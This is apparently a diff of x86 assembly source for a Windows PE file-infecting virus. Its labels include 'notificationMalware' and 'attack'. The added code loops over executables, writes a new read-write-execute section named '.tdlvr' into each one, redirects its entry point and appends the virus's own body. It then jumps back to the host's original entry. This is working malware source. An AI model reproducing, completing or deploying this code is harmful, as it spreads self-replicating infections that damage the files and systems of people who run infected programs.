@@ -53,7 +53,19 @@ read proc
 	ret
 
 read endp
+alignFunc proc	
+	;eax : value , eax : aling
+	xor edx , edx 
+	div ecx 
+	cmp edx , 0
+	je ok
+	inc eax
+ok:
+	mul ecx
+	;luc nat eax da co duoc gia tri sau khi align
+	ret
 
+alignFunc endp
 readNow proc 
 
 	mov edx , offset data
@@ -171,9 +183,6 @@ endFindAddress:
 	call dword ptr [handleGetProcAddress]
 	
 	mov dword ptr [ebp + offset handleMessageBoxA] , eax
-	
-	mov dword ptr [ebp + offset offsetString] , offset notificationMalware
-	call print
 	;-------------------------------------------------
 	;;end tan cong attack
 	
@@ -525,32 +534,332 @@ loopFindPayload:
 	call readNow
 	mov edx , dword ptr [ebp + offset data]
 	mov dword ptr [ebp + offset rawSize] , edx
+
+	mov dword ptr [ebp + offset number] , 4
+	call readNow
+	mov edx , dword ptr [ebp + offset data]
+	mov dword ptr [ebp + offset rawAddress] , edx
+	;----------------------------------------------------------------
+	push 0 
+	push 0
+	push dword ptr [ebp + offset ifanew]
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	push 1
+	push 0
+	push 56 
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov dword ptr [ebp + offset number] , 4
+	call read
+	mov eax , dword ptr [ebp + offset data]
+	mov dword ptr [ebp + offset sectionAlignment] , eax
+		
+	mov dword ptr [ebp + offset number] , 4
+	call read
+	mov eax , dword ptr [ebp + offset data]
+	mov dword ptr [ebp + offset fileAlignment] , eax
+	
+	push 1
+	push 0
+	push 16 
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov dword ptr [ebp + offset number] , 4
+	call read
+	mov eax , dword ptr [ebp + offset data]
+	add eax , dword ptr [ebp + offset virtualSize]
+	mov ecx , dword ptr [ebp + offset sectionAlignment]
+	call alignFunc
+	mov dword ptr [ebp + offset data] , eax
+	
+	push 1
+	push 0
+	push -4
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov eax , offset data
+	add eax , ebp
+	push 0
+	push 0
+	push 4
+	push eax
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleWriteFile]
+	
+	push 1
+	push 0
+	push 164
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+loopSection:	
+	mov dword ptr [ebp + offset number] , 4
+	call read
+	cmp dword ptr [ebp + offset data] , 0
+	je changeSection
+	push 1
+	push 0
+	push 36
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	jmp loopSection
+changeSection:
+	push 1
+	push 0
+	push -36
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov dword ptr [ebp + offset number] , 4
+	call read
+	mov eax , dword ptr [ebp + offset data]
+	mov dword ptr [ebp + offset vs1] , eax
+	
+	mov dword ptr [ebp + offset number] , 4
+	call read
+	mov eax , dword ptr [ebp + offset data]
+	mov dword ptr [ebp + offset va1] , eax
+	mov dword ptr [ebp + offset number] , 4
+	call read
+	mov eax , dword ptr [ebp + offset data]
+	mov dword ptr [ebp + offset rs1] , eax
+	mov dword ptr [ebp + offset number] , 4
+	call read
+	mov eax , dword ptr [ebp + offset data]
+	mov dword ptr [ebp + offset ra1] , eax
+	
+	push 1
+	push 0
+	push 16
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov eax , offset nameSectionPayload
+	add eax , ebp
+	push 0
+	push 0
+	push 8
+	push eax
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleWriteFile]
 	
 	
+	mov eax , offset virtualSize
+	add eax , ebp
+	push 0
+	push 0
+	push 4
+	push eax
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleWriteFile]
 	
-	mov edx , ebp
-	add edx , offset payload
-	mov eax , dword ptr [edx]
-	;mov edx , dword ptr [ebp + offset virtualSize]
-	;add edx , ebp
-	;sub edx , 8
-	;close hanfle
+	mov eax , dword ptr [ebp + offset va1]
+	add eax , dword ptr [ebp + offset vs1]
+	mov ecx , dword ptr [ebp + offset sectionAlignment]
+	call alignFunc
+	mov dword ptr [ebp + offset data] , eax
+	
+	mov eax , offset data
+	add eax , ebp
+	push 0
+	push 0
+	push 4
+	push eax
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleWriteFile]
+	
+	mov eax , offset rawSize
+	add eax , ebp
+	push 0
+	push 0
+	push 4
+	push eax
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleWriteFile]
+	
+	mov eax , dword ptr [ebp + offset ra1]
+	add eax , dword ptr [ebp + offset rs1]
+	mov ecx , dword ptr [ebp + offset fileAlignment]
+	call alignFunc
+	mov dword ptr [ebp + offset data] , eax
+	
+	mov eax , offset data
+	add eax , ebp
+	push 0
+	push 0
+	push 4
+	push eax
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleWriteFile]
+	
+	
+	push 1
+	push 0
+	push 12
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov eax , offset charactic
+	add eax , ebp
+	push 0
+	push 0
+	push 4
+	push eax
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleWriteFile]
+	
+	push 0
+	push 0 
+	push dword ptr [ebp + offset ifanew]
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	push 1
+	push 0 
+	push 40
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	
+	mov dword ptr [ebp +offset number] , 4
+	call read
+	
+	mov eax , dword ptr [ebp + offset data]
+	mov dword ptr [ebp + offset entrypoint] , eax
+	
+	push 1
+	push 0 
+	push -4
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov eax , dword ptr [ebp + offset va1]
+	add eax , dword ptr [ebp + offset vs1]
+	mov ecx , dword ptr [ebp + offset sectionAlignment]
+	call alignFunc
+	mov dword ptr [ebp + offset data] , eax
+	
+	mov eax , offset data
+	add eax , ebp
+	push 0
+	push 0
+	push 4
+	push eax
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleWriteFile]
+	;
+	
+	push 1
+	push 0 
+	push 192
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov eax , offset entrypoint
+	add eax , ebp
+	push 0
+	push 0
+	push 4
+	push eax
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleWriteFile]
+	;;;append payload
+	
+	
+	push 0
+	push 0
+	push dword ptr [ebp + offset rawAddress]
+	push dword ptr [ebp + offset handleFileNow]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	
+	mov eax , dword ptr [ebp + offset ra1]
+	add eax , dword ptr [ebp + offset rs1]
+	mov ecx , dword ptr [ebp + offset fileAlignment]
+	call alignFunc
+	 
+	push 0
+	push 0 
+	push eax
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+loopAppend:
+	mov eax , dword ptr [ebp + offset i]
+	cmp eax ,dword ptr [ebp + offset rawSize]
+	je nextokk
+	mov dword ptr [ebp + offset number] , 1
+	call read
+	mov eax , offset data
+	add eax , ebp
+	push 0
+	push 0
+	push 1
+	push eax
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleWriteFile]
+	inc dword ptr [ebp + offset i]
+	jmp loopAppend
+nextokk:
+	;closehandle
 	push dword ptr [ebp + offset handleFileNow]
 	call dword ptr [ebp + offset handleCloseHandle]
 	;;
 	jmp loopFileok
 	;;end
 endMain:
+	;attack:
+	mov dword ptr [ebp + offset offsetString] , offset notificationMalware
+	call print
+	
+	push 0
+	push 0
+	push 60
+	push dword ptr [ebp + offset pathNow]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	mov dword ptr [ebp + offset number] , 4
+	call read
+	mov eax , dword ptr [ebp + offset data]
+	add eax , 236
+	push 1
+	push 0 
+	push eax
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	mov dword ptr [ebp + offset number] , 4
+	call read
+	cmp dword ptr [ebp + offset data] , 0
+	je endattack
+	mov eax , dword ptr [ebp + data]
+	add eax , ebp
+	jmp eax
+endattack:	
+	;endattack
 ;data---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+entrypoint dd ?
+i dd 0
+handleFileAppend dd ?
+charactic dd 0E0000020h
+vs1 dd ?
+va1 dd ?
+rs1 dd ?
+ra1 dd ?
+sectionAlignment dd ?
+fileAlignment dd ?
 virtualSize dd ?
 rawSize dd ?
+rawAddress dd ?
 CloseHandleName db "CloseHandle" , 0
 handleCloseHandle dd ?
 handleFileNow dd ?
 pathNow db 100 dup (0)
 GetModuleFileNameAName db "GetModuleFileNameA" , 0
 handleGetModuleFileNameA dd ?
-nameSectionPayload db ".tdlvr" ,0 
+nameSectionPayload db ".tdlvr" ,0 , 0, 0
 SetFilePointerName db "SetFilePointer" , 0
 handleSetFilePointer dd ?
 WriteFileName db "WriteFile" , 0
